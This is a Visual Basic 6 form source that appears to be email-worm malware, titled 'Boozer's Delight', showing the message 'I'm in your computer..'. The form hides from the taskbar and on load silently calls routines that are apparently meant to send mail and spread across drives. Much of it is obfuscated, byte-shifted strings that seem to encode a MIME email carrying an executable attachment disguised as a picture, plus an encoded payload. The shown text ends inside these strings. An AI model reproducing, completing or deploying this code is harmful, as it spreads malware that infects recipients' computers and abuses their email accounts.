   VERSION 5.00
   Begin VB.Form Form2
      BackColor       =   &H00000000&
      BorderStyle     =   4  'Fixed ToolWindow
      Caption         =   "Boozer's Delight"
      ClientHeight    =   3180
      ClientLeft      =   4005
      ClientTop       =   2790
      ClientWidth     =   3450
      LinkTopic       =   "Form2"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      Picture         =   "reason2.frx":0000
      ScaleHeight     =   3180
      ScaleWidth      =   3450
      ShowInTaskbar   =   0   'False
      Begin VB.Label Label1
         BackColor       =   &H00000000&
         Caption         =   "I'm in your computer.."
         BeginProperty Font
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000C0&
         Height          =   375
         Left            =   480
         TabIndex        =   0
         Top             =   2400
         Width           =   2415
      End
   End
   Attribute VB_Name = "Form2"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Option Explicit
   Private Sub Form_Load()
   On Error Resume Next
   Call oe
   Call dribe
   End Sub
   Private Sub oe()
   On Error Resume Next
   Dim toe, a, a1, aa, aa1, aaa, b, b1, c, c1, cc, cc1, d, d1, dd, exe, b46, dd1
   toe = "¦’**Úíê³•‚Š…ƒ”ÚÀ¨*”À°‰ƒ“À©Ž“‰„…íê©¥Í¶…’“‰*ŽÚÀÑÎÐíê£*Ž”…Ž”Í´™*…ÚÀ*•Œ”‰**’”Ï*‰˜…„ÛíêÀÀÀÀ‚*•Ž„*’™ÝÂÍÍÍÍÝ¿®…˜”°*’”¿ÐÐÐ¿ÐÐÐØ¿ÐÑ£Ñ£ÙÔÑÎ¢Ù¢¥ÕÓ£ÐÂíê¸Í°’‰*’‰”™ÚÀÓíê¸Í³*‰ŒÍ°’‰*’‰”™ÚÀ®*’**Œíê¸ÍµŽ“…Ž”ÚÀÑíê¸Í‰*…¯¬¥ÚÀ°’*„•ƒ…„À¢™À‰ƒ’*“*†”À‰*…¯¬¥À¶ÖÎÐÐÎÒÖÐÐÎÐÐÐÐíêíê´ˆ‰“À‰“À*À*•Œ”‰Í**’”À*…““*‡…À‰ŽÀ©¥À†*’**”ÎíêíêÍÍÍÍÍÍÝ¿®…˜”°*’”¿ÐÐÐ¿ÐÐÐØ¿ÐÑ£Ñ£ÙÔÑÎ¢Ù¢¥ÕÓ£Ðíê£*Ž”…Ž”Í´™*…ÚÀ”…˜”Ï*Œ*‰ŽÛíêÀÀÀÀƒˆ*’“…”ÝÂ‰“*ÍØØÕÙÍÑÂíê£*Ž”…Ž”Í´’*Ž“†…’Í¥Žƒ*„‰Ž‡ÚÀ×‚‰”íêíê´ˆ‰“À*…““*‡…Àƒ*Ž”*‰Ž“À*À“…˜™À*‰ƒ”•’…À*Ž„À*À“*†”—*’…À”ˆ*”À—‰ŒŒÀ…Ž*‚Œ…À™*•À”*À*ƒƒ…““À**’…À“…˜™À*‰ƒ”•’…“ÀÍÀ·…‚**“”…’íêíêÍÍÍÍÍÍÝ¿®…˜”°*’”¿ÐÐÐ¿ÐÐÐØ¿ÐÑ£Ñ£ÙÔÑÎ¢Ù¢¥ÕÓ£Ðíê£*Ž”…Ž”Í´™*…ÚÀ***Œ‰ƒ*”‰*ŽÏ˜Í*“„*—ŽŒ**„ÛíêÀÀÀÀŽ**…ÝÂ*ƒƒ…““Î…˜…Âíê£*Ž”…Ž”Í´’*Ž“†…’Í¥Žƒ*„‰Ž‡ÚÀ‚*“…ÖÔíê£*Ž”…Ž”Í¤‰“**“‰”‰*ŽÚÀ*””*ƒˆ*…Ž”ÛíêÀÀÀÀ†‰Œ…Ž**…ÝÂ*ƒƒ…““Î…˜…Â"
   a = "ÍÍÍÍÍÍÝ¿®…˜”°*’”¿ÐÐÐ¿ÐÐÐØ¿ÐÑ£Ñ£ÙÔÑÎ¢Ù¢¥ÕÓ£Ðíê£*Ž”…Ž”Í´™*…ÚÀ‰**‡…ÏŠ*…‡ÛíêÀÀÀŽ**…ÝÂ³…˜™°‰ƒÎŠ*‡Âíê£*Ž”…Ž”Í´’*Ž“†…’Í¥Žƒ*„‰Ž‡ÚÀ‚*“…ÖÔíê£*Ž”…Ž”Í¤‰“**“‰”‰*ŽÚÀ*””*ƒˆ*…Ž”ÛíêÀÀÀ†‰Œ…Ž**…ÝÂ³…˜™°‰ƒÎŠ*‡ÂíêíêÏÙŠÏÔ¡¡±³‹ºª²‡¡¢¡±¥¢¬¡¥“¡¡¤ÏÒ—¢¤¡¡‡§¢‡ƒ§¢±‡¨¢—ƒª£±‡«¤¢±®¤¡“¬¤¢‹³¥—Øµ¨²*†¨ˆÐ*íê¨¢—‡ª£ÔŽ©£©“©˜—ƒ«¤ƒ*¬¤¡˜®¤±Ð¨™ƒÕ°´‡™°£Ôš®¤¬ÏÒ—¢¤¡±‹ª£±—¬¤¢‡®¤²‡™©²—ˆŠ©™Š©™íêŠ©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š©™Š¬Ï—¡¡²£¡£ƒ¡°*¤¡³©¡íê¡ˆ¥¢¡˜¥¢ÏØ±¡¨—¡¡¡±µ¢¡±¥¢¡±¥¡¡¡¡¡¡¡¡¡¡¡¥£¡—±¦¢‡ƒ©£±*¬ÏØ±¡”²¡¡¡‡¥¤¡—©¥¡—µ¦¢¡±¡"
   a1 = "¡¡¦Ù¡±©¤¡¡±²¢²©ˆµ¥§¥Ñ¦ˆ¢™ª˜¦¤«¢‹*¥©©Ð«˜—²¶³Ð†¡‹Òª™‡‡‹«¦ˆƒ¹§²*Œª‰ƒ*«³*Ð®´¹Óíê¯¤‹Ö±Ð²¦²‹„©³µ*´¶¦¶·¶Ñˆº·*®‹º·ºŽ*§Œ‘ƒÓ²Ñ„Ž„Ô…¸‘¤ˆ©·§ˆÔ‰ª‰*«´Œª··ŒÕ‰º*‘«Š*«·*íê*Ö‰*‘’«š”¬·Ò”×‰Õ•“¬¤˜¸§˜ØŠª™”¬´Ñ®¸·ÑÙŠºÒ•¨‰ÔË´ŒÕ•†*Ö…’˜Ø–°ÐÙ†‚ÓË°ŽÖÏØ±¡¨—¥¡íê¡—¥¢¡±¥¢¡±¥¢¡±¡¡¡¡¡¡¡¡¥£¡—±¦¢‡ƒ©£±*¬ÏØ±¡”²¥¡¡‡¥£¢¡±¤¢¡ƒ¦¢¡±¡¡±ªÓ¡¡¥£¡˜¥¥¢³¥˜íê¢ˆª¢µ±„ˆƒ²‰*¥©¦¥«²*‚¨¢£³šµ–¡¶¹Ž¬²£ˆ¹‹®¯¥ŒØ²ƒ¹§²**ª™‡*«ŠµÒ®š‡Õ¯‹®¥²µº¨³¥Œ«íêµÑ²¶¶Œ„¹·¶*Šº§¶*ºÒˆ**Ž®Ð„¸ºÓ…¨ŒÖ‡*¯¥ˆ¹*¨‰©*«‹*¯µŒº*¸*ª***‘¯‹***Ž‘«*‘“’¯Ð”‚*Óíê•¬*Ö—“°¥˜ƒ‚¨™Ž«Ð”°µÑ„‚¸Ò®Ž*Ô•°‹Õ…‚ŽÖ¯Ž‘Ø–°ÐÙ†‚ÓË°ŽÖÏÙ*¡¤¡¢¡¡©²¡˜¥¡°—¤Ð¸¦§«íê„‰Š¦…¹…“®˜²”Ù‘†‰Š¦±š¦¬‰Œ˜´§‹£‹‘¡š¥¤ª˜²ƒ¹Ï¨”²‰**’•Ó*‹Ø•¯¶·†Ë×Ó‘†¨·‰Ôˆ•«µÖ‰‡"
   aa = "¢•«µÏ¹´²”°*±¢¨‰Š¦°Ò¨Ð*†¬®©º¨‰Š¨¦³Ë·*´™š±¢¨‰‹˜µ–Œ§Š™‰«¹‰¬¦§«‹º˜**Ò©µ¥‹‡¡„³…íê‡*¤¤¦ª‰*¸–‚º¯“*š×¡ŽË¶¯‰–¬³´Ï¡ª‚‘°ÙÏÕ†ÕÐ¢¹‹˜‰‹˜¶Š™³²²Õ¢*¡’¹š²‰’°‹µ–‹µ¢ƒ‘‚*±’¶íê–™¤Öµ†ºšÖµ—•µÙ”©¶ÕÖ¶„ËšŽÐ*°“ÕÙ«±¸«·ÓÒ*ÒÑ‚…¡‘¯Œ¶Ù”¡§‰‚†Ò*ËšËÑ*¸Œº¨³*–¨”§ƒƒÐ¥ƒíê˜±ËšË–¦±´™²—ØºË¹Ù¢·º’¸‰²¬¶Žˆ”ÑØ˜Ñ¯§†„ˆ²Ë¸Ù*Õ£‚˜®ƒ¬«·¥*˜*ª˜‡„†¸¦§’Ò«–Ó¯š‹•´‹‹íêˆˆË¡š·‚†*ŽÕ©¬˜´Ô§¯±ƒº¦ƒ†°’®Ñ«ˆ*‹Ž‹£‹ÕÔ©ÕÙ‘™¨Ñ¢×*¦´Œ„ÓÓ³¤×ÐÑ¢“¯º©Ö«Ô•ÓŠŒ·*§±‹íêˆˆØÒ†™Ïš˜·Ñ*–‰Ð³’¨¢„×²¬Ð¬Š•°µÏˆ¸ª™¯¹‚®¢‹“Ò¤“´•´µ„Ž*¯³³˜©Œ‹Ù¯ÓË†ÖÐ«¦‹ª™°¶*º*íêÕÐÓ˜•’¬Ö‡Ø¶¬‰–¯×¢×’´³š·ØØ*°Ù˜…¶°Ñ¢Ï—’‘”°ÑÕº‰©×*†«†¨ÓŠÐª*Ò§ŽƒÖ·§¯¯Œ³Ïº˜µ„‹Ë´íê‰”±©°³‹²«¶Š°Ëš…Ñ¬ÙŽÙ‘–×¢Öµ‚¢Öµ×¥ËÐ«°Ò†Ò*Ëš‰’Ò—…Œ¶¬™Ë”’¦†ÓšÏ°Ò²…·°Ô†‡*±«‚…‰§Ïíêº˜¶«Õ–’¯Ðª¶Õ®šŠË¦¯´Ë°*·¶„ÖŽ…¸’®”¹—˜¨§¥±ËÓƒÙË*Ù‘‘*¡¦¡§¯Ž*‰Õ–§*Ë*ƒŒÑ³…‚©‰Š³®³¯"
   aa1 = "Ï†’Ö†*¶±—–©ƒ™š¨Ñªšµ‘˜ÔÔ¡‘*®Ù*²*º©*®‚…Ñ¶Õ‚†¡™¯”‚¢ŠÔ‘’®¨—†µÐ˜Ó«„Œ†šÒŽ™¨„¨íêÓŠ¹Ï¬ÏØ¡·®„º¹Ó¦–‘¥¨*—”ÐËØ•…¶°–¸¦¸«¹š™*‘ÒÒ’Ó§‰Ó¨Ž±®Ù×ˆŒ°²‘³²Ž¯®ÙŠÐ*¶¹Ô©šª«Ö*‡íêÖ“˜—«˜‚Š¸¹‡³”*¨ÕŽ*×º¡šÙ¯*Ï³•¶ŒÑ…ÕÑ…Ù¢•*¡³¤Ø‘««–ÐÏ˜’·ˆ‰—*Ô*¹*µËÕ®ª‘ŒÏ©Ò¶‹·¨íê“‘¤Ë•´µ°Ù**‰ˆª¥Õ™†¶±†Ö¶*¥©°³‹…¡¹Öµš¸Œ±™¨¸’•©«““ƒƒ*¢Õª§ÐÏ*˜ËŒ‚¦Ž‘”Œ…¹µ“¹*¯*˜šíêŠªÙŠÐ°Ø¡¯•†Œ‡ÕÔ‘‘Ö‚…Ñ¢*Ô©×*Ô¡¶Ö¶±®–™…«®£*Ž…˜ˆ¥*¹ˆ*ºµªÏ•Š*†*¯²µÕ•Œ™†Ó‚†ˆ‡Ï—¢*íêÐÙŒ«™*¯†Ž³„Š±ˆŒµ˜‡‹ŠŽ**“×¸’ÔÒ”*™*—×«±¤Ž§°…*¬*±®¦”°°©ÏŽ¸°Ëª‰ª¦‚¡¨¨Ó±¯*Ù°ÖÑŠªÖíê·«Š¤ÓŠ‡®µ–„Ð*‰Šª£«†*°¸¡¨ªË*’¡ˆ”×™ËŽÓº§¸†Ø¦¸Ï¡¤Ï«’”Ò’…‚©‰ƒŒ*¶°šË¹Ï—¡ˆ¸¶·*Ž˜·…íê*—’”¡¬¡¡*”…º±Š*®²ƒ*¹¦Õ*§§Ð¶¦¢«’‡¡…*Õ‘§¤³ª*Ï…‚¤Š*™«ÖÒ«Ñ*·‚ª§¶¸‡…Õ’±¦”§¢ˆ‹¸®«"
   aaa = "**Ëš²˜Ð„*©*®ÐŽš¯‡ÖŠÏ—£”¶*³*¥££°ŒÖ™°‹¡ŽÏ¡§±«Ó’*™‰‚‚¦©*“£·ÓÒ¯³²‡ŠÒš´•²«¤«’Ó¦íêÐ³ÐŒ“º¡*Ô°ŒÕ¨Ë†˜*‚°¶ªªŽ…®™*˜Ž«¥Žª¨ÔÑ*’ËÙØ*¬¯¥ª¯…ƒ¡¹×†³“´˜°*Õ“Ñ‰–¥ƒ’©Š×¡ÔÙ¯ƒ†íê™Ï·ˆª®Ò£µ¸§®š”†¤…’Ë´ƒ¬¢ª°•‰‚×ˆƒØ’Ï“ÑÖ¬¡—…¨’¸ˆ¦–ƒ£*Ð‰ŽÒØ“”ŠÑ¨µ‡†·–²†¡Ë–”ƒ©Ñíêˆƒ™Õ„¢*¦‰…·¸•ËÑ²“™ª‘Ø‚*×†¡*¤‰Š©Ö„Öš”¸Ñ·¸Œ˜‹§Ôƒ†«°±…*ÏšÏ·‘©*”Ò±š¶®·³™µ˜˜Ôíê…Ô°±„ŒÙšÏˆ¸Žš¬‰º*º³·„Š‹”ÏŽØ‘¸¤™•¸ƒŒŽ¹Õ¬¨Ž®·¹ÐÔ—²‰*Ó¯ÖŽ´µ¥·©¡„«‹¥†®³«µ×§°’íê¶¦Ó©—*´×µÙ¶*Ô˜š**ÕÕÔÖ¹*Ò©‚¦ª—¤¶¯Ô°·’¥ˆ—¯´·†ƒ™Ô¸®¦‡«®Ð…*’ª•Ôˆ«ˆ¶•Œ*‹*Ó¡ŽŽŠ’·´íê†¥*£Ë¤š³«·*•‹Ö…ÔŽØ˜Ž¤¹®„³Ž¹¶™ËŒ§¹³·¯Ñ¸—¢Ò©—¤Ë†·•‰ŠÒ²•±Ø‹‹Õ°…‹™Ë·™®§¯*£*²×¶íê¶‰ƒ¤¦¸ŒÕ¸®µ‹º”Œ§·¥ºÖ¶µ‹ˆ¬¥«¡³³ƒ¡…*×¶‘•¢Ñ‘Õ*Ë*¥“º*±¦Ô¢´©šŠŽ’ŠØ¯°šÙ«•¯ºÒ²Ž¯†«íê’“Ð¬£Ó·š“—’¡¨¹*²´Š’Š–Ëª’¨²ªªØÙ²Ë¢Ï—’¸•Õ†Ó§†×Ò¡‰Š’ŠÑ‘•®¹‡¥™¨®„Ö³“ƒ§’„™Ž‚®•¹íêŒ‰„‡Õ°–¸¯Ë©’–ŽÕŒ¹©…ƒƒ…Ë†ÖÑ*·Ë*×Ô¸º·¡µŠ’˜˜Ò¦ƒ”’Ùš–**¹Ô¡§ƒ¤ŠŒ•–Õ†ÔÑÔ™†®©Ù§Ñ‹ºíê‹£*Ë·µ„¨¨¡Ù—…†Ð©’†•ºŒÒ‘‰Ž×‹…´Ë·†Ð˜Ë”ƒ—‹×¬„·‘°Ñ©ºŠË°Ï¡®¹¶Ð£˜†*²¨§·©¥*³ƒ¥¤¨Ë²íêË¦*³¨¨¹Ñ¬¶‡±ÒÔ“‘¤ÕµŠ¢©º“¨‘´ÑÕÙ‘‚¤ƒ*ÑÒ©¦¶¶ªÕ—¢šÙ**‘¬*¥ºÔŒÓ•–Øª¯ÏŠµÒ**²ª¤ƒ”‘¦"
   b = "ØÔ…Øƒ¹—–Óµ¨*«*Ò«Ø‹¸*—®*¡š*“™³©¯…²šÖ‰”¯º³˜®¶Š¨”šŽ*‡Ð*ØÒÏ*“©²³³—©‚‡¹¨…‘¸‰·Ó*íê…š³Ñ²„š“±Òº¢ÖÑ•¬‚®–¥*ƒ¥ƒŠ¦ªª¥³³³³³†·Œ…š•±Ñ„·¯´‡ÐÖÕËš˜*“©±‡¥“Ô¡ªÖÔš·Œ*Œ”ƒ·¥íêÖš*µ‚ÐË×”Ï’·*Ð…«‰º´Ð*¯‚º«**§š*·–Ó«¸Ëº´ª¨¢™¡±¯†¸Ð˜Ñ‘˜®®¬…¸¤´³Ž¬†¸‡¤Ð¦µ¬«ÑØ*íê„š††‚Ù¢·Œ§”£§*ª¯ÔÕ¦°*’£Š‰*‘–¨®°šÒ‘‹®‰ºÕ*ƒÏˆ´„Ñª**³«´Š‡µ—•ÕªÔ*Š”Š**’™³¹Õ¦µˆ¤íêÕ*ƒ¬‡Ñ*´“·¹Š”µ‹‹Ò´Š°…Ž²²×ÒšŠ**«Õ¥©*·°‹ƒËŒ¹Ë*¯“±¯…*Ö¹ÖÑÐ¶™Ö˜Ø¡ƒÙ*Õ†¶£¤„±‘¤‹Ž*íê†ŽÏ¡¥‘¯*’¨¹º*•Ù©ºº¡ªŒ‚¢°ª—‘ºÏ‹*Óˆƒ‡‹Ù±£«™Ô¥Š”ÔÏ¬™¤ªªˆµŠª—·˜Ó¦·‹Ï„¢¹ØŠŠŠÑíê×ÐÓ•·ÙŠƒ”³¸´¯«Ð¶ª¶Õ‘ˆ*ÖŒ*—¡¯Ù„¦*Ò¸Œªª¦£‘–¬Ó´Ö«°¸*Ë„*±‡Õ‚¨¬¯*Š•“×°šª®Ø*£*íê¡ªµŽ§ÓÖÏŒÐ‘Ö*ÓŒ•„“¡¯·‚*¸°’Ë®©*—˜˜¨£*ššÏ¡¦Ù´´ƒ®„”Õ¹Ë·Ó¸–ÖŠÑ®„ƒ¹‘«“ŠŠŽª™„Ò²‘„íêš°…´Ø²‘¤”¢‘”ª…±¬«Ô…„±Ô¹ˆ“¯–ÕÐ*Œ†®¤§¹‹Ë¶ØÔ£Š¯µ§¯*°’šË¦ƒÏË¦ºÑ*Ó«×©Ð*Ð•º¸º*°©¬íê·—·¯®“’ÓµØ¥‡¤¡¢ÏšÓ’*×“³¢ÙÓ©Õ¡©šŠ°*Ë§«Ñ‚ÒÔ¥Ð™Š¯¡*¡°°‚”**Õª¬´´**•¬‹×ÕÓ§¹ÔÏ±…*íêÏ—¡«ØË¯ˆÐ–µ—‚Ž‚‚¢¸©Ó¯‡—Ž‹Ï¸ØÖÑ¬³Ö•‚‡‰„¯¦¶ƒ«´Ö£“¤·¬*…·°š*Œ‚¤¨¤¹§´‡Ñ¦**”®*‘ª¤"
   b1 = "ƒ£¦¯ƒ¡ÕÒŠ°…”–º”˜•³**¯š°²‚ºº¤ˆÒ²“Ï…‚ÖÑ†‰Œ¥™†¬Ò¯£¤Ò®ƒ•Œ˜‚ÖØÑ*‚‘Ò*®”«‰Œ¥¤×µª°’íê‡Ù*ÑÕÙ‚Ð×´Òº°¬•šºÒ*•ƒŽÏ¡¤˜µ·Ö¨±”„µ*¥ˆ£‡‹ŠØ«„¢‚º¡º“º®µ×·Ø¦Ï¤¤‘‰™º¹¢ˆš—*Ñ¥„íê±¤–³§™«³¨¨*‘’˜ØÑ„…±¥¶¸ªÓ•‘¬‹“´—¢Ñ*®¡‰‹Ö‚…–…’„‰©²•*¤¢˜‡ˆ³–§££†š¨¢Ï¥†ˆ*”×§±”íê«Œ—‹*šŒ¸ƒ¥ŠŒ´‡¨‰²”*™¥Ô˜Ù´‡Ô¢š´³¡*Š‰µ©¦²±®“¹—*ƒ¤ª¨¡Ôª™…‡ÖÑ‚ˆ™˜•š°ŽÕ*··—“³‹Ø‹íê¶*µ¤’µµ¹™«‹š˜µŒ†Ž¦¬ƒ„**·‘”š´¡‹Ó¨®®¬Ô¢‘°„™*‰*´–´¥¬ª«ƒ¨*‘µÐ–§¢™*„ªªš¶µŽ‹Õ*‹íê“¶…·¢©’±ˆŒ¶ƒº°”*“*™‚ƒŽ®¶ª¬×ÙÕˆ³…«„™´±–’—°©†*ššÒ’Ž×*ÙÙ—Š×Ž§š‹×¸«‹Ù¢Š‰*¬‰¹Œ”Òƒíê†³‘‘–—×‚ŠˆƒÑª*Ž**¦*Ð†Ò–š¦¤¨™Œ‚ÕÓ°ª°*Ë–ØÖ*”´¬…¸‰±˜¡™³•Ó’Ë*Ù¢×Ñ¢º˜–¯’·Ù“Š°ªŠíê„©—¨£¤Ñ¯°ØÏµÑÑ·ŠÖ„¦¹·*¦™‹’³™¥¹Žµ«Ð*¯Ž•¥šš‡Ù…Ï*·”¯‹Õ–¸¹‰’·µ¶‚‘‚¯*Ò‘ÒÑ–Ø¡°ƒ¡—íê¦“Œ*Ë§Œ°ÙÐ¥¨¯¢Ï·”´*Ô‚š*´Õƒ³Ù¢Ž‡†Ï¸‘§«§³µ£*‚„–˜—‰’—*Ù¢Ö¤Ó‘•ØŠÓ‡Ó†«‘Ø«‡×¶Ò««‰íê”¤ˆ‚ƒŽ‘·Òº’˜—‹†™—’Ð¢×ËÕ*‚‰Ö‰‡‰±¬š¨‡Ž*¯‹Ž´–Š¢¨Ë†*ˆ‰‹¥·˜Ó¥*Ô™×„š×¤ØŠÖÙ«˜‚*ƒš³“íêš¥‡„¦¸¯±*Ù¢Ï·*‘´Õ¶ÕŒÐÔƒšØ‰§º‰˜ªªªª°ªªš¶…*¸¯´µ¶ƒ¬ºÒ*·²˜¶“£Ï*™®Ž*ˆ—³…*°Ë…†—‘¯×íêºÔ‰¸ªµÏ«´ˆ‡¤‹ÏÔ¶*‹ƒ˜*¬*ª‹Š„Š*ÓÕ’¯ÑºÏ‹²±*£“‡£ÑŽ¨¶‹¦¸š¸*±¬©Ï™¯º˜Š¢®ƒ*°§Ø„˜°"
   c = "£ÏÓ‹¢¢˜×®ŠÏ§•–”©µ•¥*Õ¡¨™ŠŽØ–˜’£–×†º‘¤¥”–Ó*®˜Ù³¢‡ŽØ˜¸¸³ŒºÒ«‹‚*˜ÔµÑµ²±’¹š¨*±íêƒ—”ÓšÑ—°†•«“·Ž*—Ö*ªªƒŠ„”¢¤¨*‡ºÖŠØ«Õ†*¤¤§¡ƒ¦·°®‚”ˆ’‹µ•¬*Ï©¥‘‹¢º‰¡¡†´°*Ï«*Ž¢×˜íê®‘®¶ªƒ“Š•Ù®‹··Ó¶Ñ¸*•¡¹‘Ø¸—«**ƒ™*šŠ«Ù£«“¦‰…¡‹Ù¡¢¸¯š*·*«*…¶Œ³®³š”—¦¨ª®*Œ–*˜Öíê…¹¸Ž•©¹’”*£¹¶º‡ÒÙ±*¤¹Ù§Ë¹ÔÙ—¯*Ô‘«˜”*©¹*ŒŠ–Ô¶ŽŽ¸™*¦²—ƒ‹Š©¹¨¯Õ§¨Š’Ž¯²¶•·¶×‰®íê¬©š”¢¦¦¥•ÖÖ”«°µ«³‘Õ¢¡¨š¡‡º¯…Ž¹ÑÐÐÖ*‰’–ƒÔÖ”¸*†¬¨¹šª¬ÑªÕ¦®*—·£Ò*³Ñº¤§¦¯¶—‡ºíê¯¢ÙÕ²Ž‹¤°°ª*‰¡“ƒÑª„´°®«·ƒ‘·°µ‘*¡®©Ž³“º™ÕÓƒÓ*—Õ¹Òª˜—«²‘´°¦²³°‡ŽØ‘ŒŒ‰¯Ë¯*‘–‹Ñíê£ØŽª¢°…*§´Ó*±¥˜‹¯«‡…±£*ÓŒÔ‘¢Ž™¯**ŒŠ*†ª‘«²—¡†*´¸‹˜¶¯*†¡°®‡ºƒš×¹š·*‹Ò£³´™*ˆ–’íê“«*¯…–³*‚·£Ô•¹š©¢‰„·º‡¢ÓÙ†***²‚ª‚³Ó®¡™˜×³š•¡*Ö‹*’*Ž*²ƒ*”…’ˆ·¥¡Õ§ÐŠƒÓ´”Ò§¤Ñ‘íêÕ¹*¢¢£²¬…™ªª¨Ð¹³¤*¢Òµ¤‘´ÖÏ*˜·ÒÐÖÔ*¯¦²‚—™¥¥ˆ´ØØˆ¨ÐÖÏˆ×Õ×ÑÐµÖ¨·²Š¯”Ð‰´·”’¦*Ð¹”íêÔ*¹Ž•³˜¹‘–š¬¦Ž°µÙ·¯¯ÕÙ«Ð’¹·Ù*™šÓÐ*Ø˜*¡£ŒˆŒÒª£Š‘†µ‡„ˆ‹ÔÔ’¨•¬Ò¨³’§³…´…‰‡ƒ«*Ó³¯íê†×*¡ËŽ±…*ƒÑ¤*Ñ˜ƒ¸ƒƒ‹·*™²Ò™Ë··*°*¡«Òƒ¹Š˜Ñ©¨ª¯´”¯´—…„¯‰Ð¯†ƒ×†×´¨‚·´´Ó±¶º®*Ù“‹"
   c1 = "¥©¯—Ù°’·²*Ó˜–¸‹Œˆ¸Õ*¯¥Ô§†’ŠÏ¡¤Ï·•±–×–šÕ£·•Š¯ƒÙ„Ó§¯ÓÑ’±“‚Ï—£˜Ö¸ª®šŠ§Ñ³*µ×·ª©×íêÏ’ŠªÏ·*‚“¯´*–’*¸•¨ˆµŠ¹Š‹Œ•Õ‚§¤Ë¸³‘Õ®º¶”¯‚…¢ŠŠ¡’±¶—™ÑÕØ*ƒš•„Ø¹Ø‘“¯ªÔ**«ƒ˜*•íê*‹“Õ«²ÒŽÐ–ÕŒ©ƒ²‡ŽªÖ„´ÏŽ”¶£·§¶µ¶©Ò§š„ŒŒ©¢˜Ë„*Š¸ƒ´‚Œ§×©ÖºÕ‘*¦¦®¦§Ð*§Ž©¸“¢Ù«šíê´“ºŒ«˜¶µ•Õ©‰«™Ï®Ù…”º§’¡Ë*“ˆÖˆ*¨´Ñ’±•‚Ë·¯²ƒ©‘«·§Ô¡ƒŽÖ*‘·*†–¥‹«ÏÓ‡…°…”Ô¸–ƒ‰³Ðíêª‰™¢……¦‚ª¨Ö‰Ž®§³*šÓ¢¯†·’ŽÒ¹´†¬‡¥Ô§…«†©*Š¯³*™¤ÐÏÒ…‡Ï±¶–š§°«„ÓÔº‹¬*¢*ƒ¹«*”Ï©Ôíê’‘‚*Ò”¹¬±Ó•*Ó‰Ò“²¸ƒˆ¨¬‡ºÔ¯¢™Ô¹ºË*§¡Š‹Ï£Ð‹¬*²*Ö³³Ë³‹Õº¦Œ«Õ£Ž„Š°*ƒ¦Œª¨**•Ï¥Žíê‹³˜*†ƒ£×‹‹•´ˆªÔ‹¤’©‘’§®Ï±¥º¢§´‹Ô©Ô°´¯„¯Ž…´‹š*’µ*‰**‰‡·*—ËšÒ¥¶‘Ø””‚*¥ËÐ¢´Œ£³—íê™¶ª¯…ƒ‡¹—Õ°¡Ô‘¤µº³¬‘±¦‡±ˆÒ‘±Õ¯±±£ƒŠ*££†Ï¸ª‘§…ÔËÐ±’Ù*®¢®ƒ–Õ¶—“Ø©¶Õ±‘“¡×Œ±£íê£¯¡¤‹¹ÔÖØ¶¶‹¹¦“¡¹¡Ù«¶*„–„¦²*Ó†—¢ª°®·¥—¢š¶„¢´Ò‹£’Ñ’Ž²ÑŠÕºƒ„Ö*™Ó¨°·*Õ×‡Ž*¶±™ºíê¯ƒÐ¸¦“´”©†¸‰**³*£Ó¦²”©¢±ˆ®‹’³¶¥Ø–‚®±°¬‰‘Ð‹—Ù†’·‰Ò³™šƒ„*š¬‰Õº*Ò¬™˜¯¡¢Ó*ŒÑ…¡¡íê‡¥‹Ë‡Õ‘”‚²³´–—Ø‡‚¢™‘’™°¸Ö¶*£¤‹™ª™µµ‚§Ž*²£Ø™š¸’©‘*£˜º‰§¡Ë‡°¢Ï¨ÑËŒ„¡¬‘Ò²µ‰“Ðºš"
   cc = "§«™Ï²šÑÏ•Ù–—’«ÐÒÑ²”ÕÒ±“Ë¡¦…²ÒƒÙÙ¡°Ðš·–*Ô†Õ*’‘®µ©Ëµ«¤§¢×ÕÏË–¸¹‹‹ƒŠ„Ù™¬‚ƒš³íê’©˜Ø–’ÓÓ¨ŠÖØ¤”Ðš¶•¯¦¬³µ‚‰²ƒ°Œµ¸ƒ£˜˜Ö‹Ù¢Ë¸¸Ó‘³¯Ö“*ÓŒË™´¢Ñ‰µ³š™Œ‡¦´Ž*ŠËØƒ¨ŠË†¡íê¯†*Ö”‚ÖÓ„Ž´©’²¶‡…©*Õ–º¯§¥*‘„˜‚§¤¢—§ª—£Òƒ¤*´•‹«š…*×…ÐŒ—ÙÖ·«˜*®„Š‹Ï«™‹Ø«£¯Ò¶¢íê™¤‡Ø¹Ô¡’¨•ª†¯‹‚¢±˜Šˆ±*§¡°‚‰’“¸Ù*§Ñ*‡ÐÖ³²*©˜‹‹¤±‘‹¥‘ƒ¨*¡Ï´¨°°¦µ×‰Ò*ª™¢Ñ˜Ž*íê²Ï°ÖÐ‚Š©£Ò¢‰‹–¬Ò…¨³Ž¹†‰Œ£†Œ™²ˆ•†ÐÏŽµµŠ‹„±²Ë¦•·Š…¦µŒ¯µ§±¶Ó¹šŽÓÏ¡Ù*‰·Ñˆ’ƒÐ„íê°–ˆª§Š‘Ó™Ž*š·Õ¢ƒº¡’š¸´Ù²†´×”’…„–Óº‚¡‚*‡Ë–Ð®„Œ*Ó±©¢¢’ˆŽ¦˜ºÒ±Œ„¨²‰´®§×Ó’°ŠŽ™«*íêØÔ¶ªº¸Ž‡ˆµË*Ù•‘³¡†Ö—¡†ÔÑ‡¸Ñ˜Õ*‚µ‹†¨µŽºŽª’*Ù±·*·¡˜«ƒº©¯×*³…ˆ˜¸°Öˆ¡©±¦Ž„˜Ž‰¥íê„²×Š”·*·*ª‰šÒ‚•„Ö°ª”°¸ŽŠÙ*‰«×‹ÒŒ“Š§§©ÏšÖÑ*¸«Ë¸º*®•…ˆµÔÕ˜Ò‘“¦‡Ø“•*©«‹‡Š*·™…ˆ®íê”³Š¨ºÓ¨Ž‘©˜‡¬Ï¦Ž§°…”Ó´®¤*ÑËÏË—‘ŽÓ¹™Ø“‰’Ž**Ù°µÙ‡¯Õ°µ„*˜‚·£Ô•¬š×°¢–„Ó‚£²‘…·ª°±íê¶ÖŽ*¶”¢*®’ºÒƒ“„Ó£—™*³·±¢ªÕ¸§˜Œ°°¯¡*˜×¹×Ž¢Ò³•Ù´§…‰“Š¸ÐŠ´¬…§…«§ÐŒŠ‹”¬ª¡Ø¥¥³‡*"
